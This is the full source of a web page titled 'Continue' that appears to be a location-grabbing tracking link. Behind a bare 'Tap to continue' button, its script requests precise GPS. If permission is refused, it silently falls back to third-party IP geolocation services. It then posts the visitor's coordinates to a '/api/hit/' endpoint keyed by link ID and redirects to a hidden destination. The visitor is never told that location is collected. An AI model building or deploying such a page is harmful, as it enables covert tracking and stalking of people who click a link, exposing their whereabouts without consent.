<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>Continue</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  min-height: 100vh;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  touch-action: manipulation;
}

.container {
  text-align: center;
  padding: 20px;
  width: 100%;
  max-width: 300px;
}

.btn {
  background: white;
  color: #667eea;
  border: none;
  padding: 16px 40px;
  font-size: 18px;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  width: 100%;
}

.btn:active {
  transform: scale(0.98);
}

.hidden {
  display: none;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin: 20px auto 0;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

p {
  color: white;
  font-size: 16px;
  margin-bottom: 20px;
}

.status {
  color: white;
  font-size: 13px;
  margin-top: 15px;
  opacity: 0;
  transition: opacity 0.3s;
}

.status.show {
  opacity: 1;
}
</style>
</head>
<body>
<div class="container">
  <p>Tap to continue</p>
  <button class="btn" id="continueBtn">Continue →</button>
  <div id="loading" class="spinner hidden"></div>
  <div id="status" class="status"></div>
</div>

<script>
const linkId = window.location.pathname.split('/').pop();
let destUrl = 'https://google.com';
let locationSent = false;
let locationRequested = false;

const continueBtn = document.getElementById('continueBtn');
const loading = document.getElementById('loading');
const statusDiv = document.getElementById('status');

function showStatus(msg) {
  statusDiv.textContent = msg;
  statusDiv.classList.add('show');
}

// Get destination URL
fetch('/api/hits/' + linkId)
  .then(r => r.json())
  .then(d => { if (d.dest) destUrl = d.dest; })
  .catch(() => {});

function sendLocation(lat, lon, acc, source) {
  if (locationSent) return;
  locationSent = true;
  
  console.log(`Sending location from ${source}: ${lat}, ${lon}`);
  
  fetch('/api/hit/' + linkId, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ lat, lon, acc })
  }).catch(() => {});
  
  // Redirect after saving
  setTimeout(() => {
    window.location.href = destUrl;
  }, 300);
}

// IP Geolocation (always works, no permission needed)
function getIPLocation() {
  showStatus('Getting network location...');
  
  // Try multiple IP geolocation services for redundancy
  const services = [
    'https://ipapi.co/json/',
    'https://ipinfo.io/json/',
    'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
  ];
  
  let serviceIndex = 0;
  
  function tryNextService() {
    if (serviceIndex >= services.length) {
      // All services failed, send null
      sendLocation(null, null, null, 'ip-failed');
      return;
    }
    
    fetch(services[serviceIndex])
      .then(response => {
        if (!response.ok) throw new Error('Service failed');
        return response.json();
      })
      .then(data => {
        let lat = null, lon = null;
        
        // Handle different API response formats
        if (data.latitude && data.longitude) {
          lat = data.latitude;
          lon = data.longitude;
        } else if (data.lat && data.lon) {
          lat = data.lat;
          lon = data.lon;
        } else if (data.loc) {
          const coords = data.loc.split(',');
          lat = parseFloat(coords[0]);
          lon = parseFloat(coords[1]);
        }
        
        if (lat && lon) {
          sendLocation(lat, lon, 5000, 'ip');
        } else {
          serviceIndex++;
          tryNextService();
        }
      })
      .catch(() => {
        serviceIndex++;
        tryNextService();
      });
  }
  
  tryNextService();
}

// HTML5 GPS Geolocation (requires permission)
function getGPSLocation() {
  showStatus('Requesting GPS permission...');
  
  if (!navigator.geolocation) {
    showStatus('GPS not supported, using network...');
    getIPLocation();
    return;
  }
  
  // Set a timeout - if GPS takes too long, fallback to IP
  const gpsTimeout = setTimeout(() => {
    showStatus('GPS taking too long, using network...');
    getIPLocation();
  }, 8000);
  
  navigator.geolocation.getCurrentPosition(
    pos => {
      clearTimeout(gpsTimeout);
      showStatus('GPS location captured!');
      sendLocation(
        pos.coords.latitude,
        pos.coords.longitude,
        Math.round(pos.coords.accuracy),
        'gps'
      );
    },
    err => {
      clearTimeout(gpsTimeout);
      console.log('GPS Error:', err.code, err.message);
      
      // GPS failed or denied, fallback to IP
      if (err.code === 1) {
        showStatus('GPS permission denied, using network...');
      } else if (err.code === 2) {
        showStatus('GPS unavailable, using network...');
      } else if (err.code === 3) {
        showStatus('GPS timeout, using network...');
      }
      getIPLocation();
    },
    { 
      enableHighAccuracy: true, 
      timeout: 7000, 
      maximumAge: 0 
    }
  );
}

function startTracking() {
  if (locationRequested) return;
  locationRequested = true;
  
  continueBtn.style.display = 'none';
  loading.classList.remove('hidden');
  
  // Try GPS first, will fallback to IP automatically
  getGPSLocation();
}

continueBtn.addEventListener('click', startTracking);
</script>
</body>
</html>
